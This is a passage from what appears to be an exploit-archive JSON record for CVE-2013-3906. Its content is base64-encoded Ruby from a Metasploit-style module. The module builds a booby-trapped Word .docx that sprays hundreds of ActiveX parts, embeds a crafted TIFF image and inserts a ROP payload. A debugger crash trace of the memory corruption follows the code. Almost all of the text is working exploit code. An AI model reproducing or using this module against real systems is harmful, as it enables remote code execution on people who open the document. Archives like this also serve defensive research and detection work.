kcmF3aW5nbWwuY2hhcnQreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9jaGFydCIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC9jaGFydHMvY2hhcnQ1LnhtbCIsDQogICAgICA6Y29udGVudF90eXBlID0+ICJhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuZHJhd2luZ21sLmNoYXJ0K3htbCINCiAgICB9DQoNCiAgICBpdGVtcyA8PCB7DQogICAgICA6aWQgICAgICAgICAgID0+IChsYXN0X3JpZCArPSAxKSwNCiAgICAgIDp0eXBlICAgICAgICAgPT4gIiN7QHNjaGVtYX0vY2hhcnQiLA0KICAgICAgOmZuYW1lICAgICAgICA9PiAiL3dvcmQvY2hhcnRzL2NoYXJ0Ni54bWwiLA0KICAgICAgOmNvbnRlbnRfdHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LmRyYXdpbmdtbC5jaGFydCt4bWwiDQogICAgfQ0KDQogICAgcmV0dXJuIGxhc3RfcmlkLCBpdGVtcw0KICBlbmQNCg0KDQogICMNCiAgIyBNYW51YWxseSBjcmVhdGUgZXZlcnl0aGluZyBtYW51YWxseSBpbiB0aGUgQWN0aXZlWCBkaXJlY3RvcnkNCiAgIw0KICBkZWYgaW5pdF9hY3RpdmV4X2ZpbGVzKGxhc3RfcmlkKQ0KICAgIGFjdGl2ZXggPSBbXQ0KDQogICAgMHgyNTAudGltZXMgZG8gfGl8DQogICAgICBpZCA9IChsYXN0X3JpZCArPSAxKQ0KDQogICAgICBiaW4gID0gew0KICAgICAgICA6Zm5hbWUgPT4gIi93b3JkL2FjdGl2ZVgvYWN0aXZlWCN7aWQudG9fc30uYmluIiwNCiAgICAgICAgOmJpbiA9PiBtYWtlX2FjdGl2ZXhfYmluDQogICAgICB9DQoNCiAgICAgIHhtbCAgPSB7DQogICAgICAgIDpmbmFtZSA9PiAiL3dvcmQvYWN0aXZlWC9hY3RpdmVYI3tpZC50b19zfS54bWwiLA0KICAgICAgICA6eG1sID0+IG1ha2VfYWN0aXZleF94bWwoaWQpDQogICAgICB9DQoNCiAgICAgIHJlbHMgPSB7DQogICAgICAgIDpmbmFtZSA9PiAiL3dvcmQvYWN0aXZlWC9fcmVscy9hY3RpdmVYI3tpZC50b19zfS54bWwucmVscyIsDQogICAgICAgIDpyZWxzID0+IG1ha2VfYWN0aXZleF94bWxfcmVhbHMoaWQsICJhY3RpdmVYI3tpZC50b19zfS5iaW4iKQ0KICAgICAgfQ0KDQogICAgICBjdCAgID0gImFwcGxpY2F0aW9uL3ZuZC5tcy1vZmZpY2UuYWN0aXZlWCt4bWwiDQogICAgICB0eXBlID0gIiN7QHNjaGVtYX0vY29udHJvbCINCg0KICAgICAgYWN0aXZleCA8PCB7DQogICAgICAgIDppZCAgICAgICAgICAgPT4gaWQsDQogICAgICAgIDpiaW4gICAgICAgICAgPT4gYmluLA0KICAgICAgICA6eG1sICAgICAgICAgID0+IHhtbCwNCiAgICAgICAgOnJlbHMgICAgICAgICA9PiByZWxzLA0KICAgICAgICA6Y29udGVudF90eXBlID0+IGN0LA0KICAgICAgICA6dHlwZSAgICAgICAgID0+IHR5cGUNCiAgICAgIH0NCiAgICBlbmQNCg0KICAgIHJldHVybiBsYXN0X3JpZCwgYWN0aXZleA0KICBlbmQNCg0KDQogICMNCiAgIyBDcmVhdGUgYSBbQ29udGVudF9UeXBlcy54bWxdLCBlYWNoIG5vZGUgY29udGFpbnMgdGhlc2UgYXR0cmlidXRlczoNCiAgIyA6UGFydE5hbWUgICAgIFRoZSBwYXRoIHRvIGFuIEFjdGl2ZVggWE1MIGZpbGUNCiAgIyA6Q29udGVudFR5cGUgIFRoZSBjb250ZW50dHlwZSBvZiB0aGUgWE1MIGZpbGUNCiAgIw0KICBkZWYgaW5pdF9jb250ZW50dHlwZV94bWxfZmlsZSgqaXRlbXMpDQogICAgb3ZlcnJpZGVzID0gW10NCiAgICBpdGVtcy5lYWNoIGRvIHxpdGVtfA0KICAgICAgaXRlbS5lYWNoIGRvIHxvYmp8DQogICAgICAgIG92ZXJyaWRlcyA8PCB7OlBhcnROYW1lID0+IG9ials6Zm5hbWVdIHx8IG9ials6eG1sXVs6Zm5hbWVdLCA6Q29udGVudFR5cGUgPT4gb2JqWzpjb250ZW50X3R5cGVdfQ0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICB7OmZuYW1lID0+ICJbQ29udGVudF9UeXBlc10ueG1sIiwgOmRhdGEgPT4gbWFrZV9jb250ZW50dHlwZV94bWwob3ZlcnJpZGVzKX0NCiAgZW5kDQoNCg0KICAjDQogICMgQ3JlYXRlcyB0aGUgdGlmZiBmaWxlDQogICMNCiAgZGVmIGluaXRfdGlmZl9maWxlKGxhc3RfcmlkKQ0KICAgIGlkID0gbGFzdF9yaWQgKyAxDQogICAgdGlmZl9kYXRhID0gew0KICAgICAgOmlkICAgPT4gaWQsDQogICAgICA6Zm5hbWUgPT4gIi93b3JkL21lZGlhL2ltYWdlMS5qcGVnIiwNCiAgICAgIDpkYXRhICA9PiBtYWtlX3RpZmYsDQogICAgICA6dHlwZSAgPT4gIiN7QHNjaGVtYX0vaW1hZ2UiDQogICAgfQ0KDQogICAgcmV0dXJuIGlkLCB0aWZmX2RhdGENCiAgZW5kDQoNCiAgIw0KICAjIENyZWF0ZSB0aGUgZG9jdW1lbnQueG1sLnJlbHMgZmlsZQ0KICAjDQogIGRlZiBpbml0X2RvY194bWxfcmVhbHNfZmlsZShwcmVfZGVmcywgYWN0aXZleCwgdGlmZikNCiAgICByZWFscyA9IFtdDQogICAgcHJlX2RlZnMuZWFjaCBkbyB8b2JqfA0KICAgICAgcmVhbHMgPDwgezppZCA9PiBvYmpbOmlkXSwgOnR5cGUgPT4gb2JqWzp0eXBlXSwgOnRhcmdldCA9PiBvYmpbOmZuYW1lXS5nc3ViKC9eXC93b3JkXC8vLCAnJyl9DQogICAgZW5kDQoNCiAgICBhY3RpdmV4LmVhY2ggZG8gfG9ianwNCiAgICAgIHJlYWxzIDw8IHs6aWQgPT4gb2JqWzppZF0sIDp0eXBlID0+IG9ials6dHlwZV0sIDp0YXJnZXQgPT4gb2JqWzp4bWxdWzpmbmFtZV0uZ3N1YigvXlwvd29yZFwvLywgJycpfQ0KICAgIGVuZA0KDQogICAgcmVhbHMgPDwgezppZCA9PiB0aWZmWzppZF0sIDp0eXBlID0+IHRpZmZbOnR5cGVdLCA6dGFyZ2V0ID0+IHRpZmZbOmZuYW1lXS5nc3ViKC9eXC93b3JkXC8vLCAnJyl9DQoNCiAgICB7OmZuYW1lID0+ICIvd29yZC9fcmVscy9kb2N1bWVudC54bWwucmVscyIsIDpkYXRhID0+IG1ha2VfZG9jX3htbF9yZWFscyhyZWFscyl9DQogIGVuZA0KDQogICMNCiAgIyBMb2FkcyBhIGZpaWxlDQogICMNCiAgZGVmIHJlYWRfZmlsZShmbmFtZSkNCiAgICBidWYgPSAnJw0KICAgIDo6RmlsZS5vcGVuKGZuYW1lLCAicmIiKSBkbyB8ZnwNCiAgICAgIGJ1ZiA8PCBmLnJlYWQNCiAgICBlbmQNCg0KICAgIGJ1Zg0KICBlbmQNCg0KDQogICMNCiAgIyBQYWNrYWdlcyBldmVyeXRoaW5nIHRvIGRvY3gNCiAgIw0KICBkZWYgbWFrZV9kb2N4KHBhdGgpDQogICAgcHJpbnRfc3RhdHVzKCJJbml0aWFsaXppbmcgZmlsZXMuLi4iKQ0KICAgIGxhc3RfcmlkID0gMA0KICAgIGxhc3RfcmlkLCBkb2NfeG1sX3JlbHNfaXRlbXMgPSBpbml0X2RvY194bWxfcmVsc19pdGVtcyhsYXN0X3JpZCkNCiAgICBsYXN0X3JpZCwgYWN0aXZleCAgICAgICAgICAgID0gaW5pdF9hY3RpdmV4X2ZpbGVzKGxhc3RfcmlkKQ0KICAgIGxhc3RfcmlkLCBkb2NfcHJvcHMgICAgICAgICAgPSBpbml0X2RvY19wcm9wcyhsYXN0X3JpZCkNCiAgICBsYXN0X3JpZCwgdGlmZl9maWxlICAgICAgICAgID0gaW5pdF90aWZmX2ZpbGUobGFzdF9yaWQpDQogICAgZG9jX3htbCAgICAgICAgICAgICAgICAgICAgICA9IGluaXRfZG9jX3htbChsYXN0X3JpZCwgZG9jX3htbF9yZWxzX2l0ZW1zLCBhY3RpdmV4LCB0aWZmX2ZpbGUpDQogICAgY3RfeG1sX2ZpbGUgICAgICAgICAgICAgICAgICA9IGluaXRfY29udGVudHR5cGVfeG1sX2ZpbGUoYWN0aXZleCwgZG9jX3htbF9yZWxzX2l0ZW1zLCBkb2NfcHJvcHMsIFtkb2NfeG1sXSkNCiAgICBkb2NfeG1sX3JlYWxzX2ZpbGUgICAgICAgICAgID0gaW5pdF9kb2NfeG1sX3JlYWxzX2ZpbGUoZG9jX3htbF9yZWxzX2l0ZW1zLCBhY3RpdmV4LCB0aWZmX2ZpbGUpDQogICAgcmVsc194bWwgICAgICAgICAgICAgICAgICAgICA9IGluaXRfcmVscyhkb2NfeG1sLCBkb2NfcHJvcHMpDQoNCiAgICB6aXAgPSBSZXg6OlppcDo6QXJjaGl2ZS5uZXcNCiAgICBEaXJbIiN7cGF0aH0vKiovKioiXS5lYWNoIGRvIHxmaWxlfA0KICAgICAgcCA9IGZpbGUuc3ViKHBhdGgrJy8nLCcnKQ0KDQogICAgICBpZiBGaWxlLmRpcmVjdG9yeT8oZmlsZSkNCiAgICAgICAgcHJpbnRfc3RhdHVzKCJQYWNraW5nIGRpcmVjdG9yeTogI3twfSIpDQogICAgICAgIHppcC5hZGRfZmlsZShwKQ0KICAgICAgZWxzZQ0KICAgICAgICAjIEF2b2lkIHBhY2tpbmcgaW1hZ2UxLmpwZWcgYmVjYXVzZSB3ZSdsbCBsb2FkIGl0IHNlcGFyYXRlbHkNCiAgICAgICAgaWYgZmlsZSAhfiAvbWVkaWFcL2ltYWdlMVwuanBlZy8NCiAgICAgICAgICBwcmludF9zdGF0dXMoIlBhY2tpbmcgZmlsZTogI3twfSIpDQogICAgICAgICAgemlwLmFkZF9maWxlKHAsIHJlYWRfZmlsZShmaWxlKSkNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiUGFja2luZyBBY3RpdmVYIGNvbnRyb2xzLi4uIikNCiAgICBhY3RpdmV4LmVhY2ggZG8gfGF4fA0KICAgICAgYXhfYmluICA9IGF4WzpiaW5dDQogICAgICBheF94bWwgID0gYXhbOnhtbF0NCiAgICAgIGF4X3JlbHMgPSBheFs6cmVsc10NCg0KICAgICAgdnByaW50X3N0YXR1cygiUGFja2luZyBmaWxlOiAje2F4X2Jpbls6Zm5hbWVdfSIpDQogICAgICB6aXAuYWRkX2ZpbGUoYXhfYmluWzpmbmFtZV0sIGF4X2Jpbls6YmluXSkNCg0KICAgICAgdnByaW50X3N0YXR1cygiUGFja2luZyBmaWxlOiAje2F4X3htbFs6Zm5hbWVdfSIpDQogICAgICB6aXAuYWRkX2ZpbGUoYXhfeG1sWzpmbmFtZV0sIGF4X3htbFs6eG1sXSkNCg0KICAgICAgdnByaW50X3N0YXR1cygiUGFja2luZyBmaWxlOiAje2F4X3JlbHNbOmZuYW1lXX0iKQ0KICAgICAgemlwLmFkZF9maWxlKGF4X3JlbHNbOmZuYW1lXSwgYXhfcmVsc1s6cmVsc10pDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoIlBhY2tpbmcgZmlsZTogI3tjdF94bWxfZmlsZVs6Zm5hbWVdfSIpDQogICAgemlwLmFkZF9maWxlKGN0X3htbF9maWxlWzpmbmFtZV0sIGN0X3htbF9maWxlWzpkYXRhXSkNCg0KICAgIHByaW50X3N0YXR1cygiUGFja2luZyBmaWxlOiAje3RpZmZfZmlsZVs6Zm5hbWVdfSIpDQogICAgemlwLmFkZF9maWxlKHRpZmZfZmlsZVs6Zm5hbWVdLCB0aWZmX2ZpbGVbOmRhdGFdKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJQYWNraW5nIGZpbGU6ICN7ZG9jX3htbFs6Zm5hbWVdfSIpDQogICAgemlwLmFkZF9maWxlKGRvY194bWxbOmZuYW1lXSwgZG9jX3htbFs6eG1sXSkNCg0KICAgIHByaW50X3N0YXR1cygiUGFja2luZyBmaWxlOiAje3JlbHNfeG1sWzpmbmFtZV19IikNCiAgICB6aXAuYWRkX2ZpbGUocmVsc194bWxbOmZuYW1lXSwgcmVsc194bWxbOmRhdGFdKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJQYWNraW5nIGZpbGU6ICN7ZG9jX3htbF9yZWFsc19maWxlWzpmbmFtZV19IikNCiAgICB6aXAuYWRkX2ZpbGUoZG9jX3htbF9yZWFsc19maWxlWzpmbmFtZV0sIGRvY194bWxfcmVhbHNfZmlsZVs6ZGF0YV0pDQoNCiAgICB6aXAucGFjaw0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIEByb3BfcGF5bG9hZCA9IGdldF9yb3BfcGF5bG9hZA0KICAgIEBzY2hlbWEgPSAiaHR0cDovL3NjaGVtYXMub3BlbnhtbGZvcm1hdHMub3JnL29mZmljZURvY3VtZW50LzIwMDYvcmVsYXRpb25zaGlwcyINCiAgICBwYXRoID0gRmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAiZXhwbG9pdHMiLCAiQ1ZFLTIwMTMtMzkwNiIpDQogICAgZG9jeCA9IG1ha2VfZG9jeChwYXRoKQ0KICAgIGZpbGVfY3JlYXRlKGRvY3gpDQogIGVuZA0KDQplbmQNCg0KPWJlZ2luDQoNCjA6MDAwPiByDQplYXg9NDE0MjQyZjQgZWJ4PTAwMDAwMDAwIGVjeD0yMmE5NjJhMCBlZHg9NDQxOTEzOTggZXNpPTIyYzRkMzM4IGVkaT0xY2ZlNWRjMA0KZWlwPTQ0MDIzYTJhIGVzcD0wMDExZmQ4YyBlYnA9MDAxMWZkOTggaW9wbD0wICAgICAgICAgbnYgdXAgZWkgbmcgbnogbmEgcGUgbmMNCmNzPTAwMWIgIHNzPTAwMjMgIGRzPTAwMjMgIGVzPTAwMjMgIGZzPTAwM2IgIGdzPTAwMDAgICAgICAgICAgICAgZWZsPTAwMDEwMjg2DQpPR0whR2RpcENyZWF0ZVBhdGgrMHg1ODoNCjQ0MDIzYTJhIGZmNTA1MCAgICAgICAgICBjYWxsICAgIGR3b3JkIHB0ciBbZWF4KzUwaF0gIGRzOjAwMjM6NDE0MjQzNDQ9Pz8/Pz8/Pz8NCjA6MDAwPiBrDQpDaGlsZEVCUCBSZXRBZGRyICANCldBUk5JTkc6IFN0YWNrIHVud2luZCBpbmZvcm1hdGlvbiBub3QgYXZhaWxhYmxlLiBGb2xsb3dpbmcgZnJhbWVzIG1heSBiZSB3cm9uZy4NCjAwMTFmZDk4IDQzN2E5NjgxIE9HTCFHZGlwQ3JlYXRlUGF0aCsweDU4DQowMDExZmRjOCA0MzdiMTFiMCBnZngrMHg5NjgxDQowMDExZmRmMCA0MjJiNTZlNSBnZngrMHgxMTFiMA0KMDAxMWZlMTggNDIyYTk5Zjcgb2FydCFPcmRpbmFsMzU4NCsweDg2DQowMDExZmVkOCA0MjJhOTkyMSBvYXJ0IU9yZGluYWw3NjQ5KzB4MmIyDQowMDExZmVmMCA0MjJhODY3NiBvYXJ0IU9yZGluYWw3NjQ5KzB4MWRjDQowMDEyMDBiYyA0MjJhODVhOCBvYXJ0IU9yZGluYWw0MTQ1KzB4MTk5DQowMDEyMDBmYyA0MjQ4OThjNiBvYXJ0IU9yZGluYWw0MTQ1KzB4Y2INCjAwMTIwMWJjIDQyNDg5YjU2IG9hcnQhT3JkaW5hbDMxNDYrMHhiMTUNCjAwMTIwMmNjIDQyMmEzN2RmIG9hcnQhT3JkaW5hbDMxNDYrMHhkYTUNCjAwMTIwMzMwIDQyMmEyYTczIG9hcnQhT3JkaW5hbDI4NjIrMHgxNGUNCjAwMTIwMzYwIDMxNzgyMWE5IG9hcnQhT3JkaW5hbDI0NTgrMHg1ZQ0KMDAxMjAzYmMgMzE3ODIxMTAgd3dsaWIhR2V0QWxsb2NDb3VudGVycysweDliZDUxDQowMDEyMDRhNCAzMTc3ZDFmMiB3d2xpYiFHZXRBbGxvY0NvdW50ZXJzKzB4OWJjYjgNCjAwMTIwN2VjIDMxNzdjYWVmIHd3bGliIUdldEFsbG9jQ291bnRlcnMrMHg5NmQ5YQ0KMDAxMjA4OGMgMzE3N2M3YTAgd3dsaWIhR2V0QWxsb2NDb3VudGVycysweDk2Njk3DQowMDEyMDliMCAzMTc1YWI4MyB3d2xpYiFHZXRBbGxvY0NvdW50ZXJzKzB4OTYzNDgNCjAwMTIwOWQ0IDMxNzU2OWUwIHd3bGliIUdldEFsbG9jQ291bnRlcnMrMHg3NDcyYg0KMDAxMjBhZDQgMzE3NTQwZjUgd3dsaWIhR2V0QWxsb2NDb3VudGVycysweDcwNTg4DQowMDEyMGFmYyAzMTc1NDAwYiB3d2xpYiFHZXRBbGxvY0NvdW50ZXJzKzB4NmRjOWQNCg0KICBUby1kbzoNCiAgVHVybiB0aGUgZG9jeCBwYWNrYWdpbmcgaW50byBhIG1peGluLiBHb29kIGx1Y2sgd2l0aCB0aGF0LiANCiAgDQo9ZW5k", 
    "filename": "platforms/windows/remote/30011.rb", 
    "id": "30011", 
    "cves": [
        "CVE-2013-3906"
    ]
}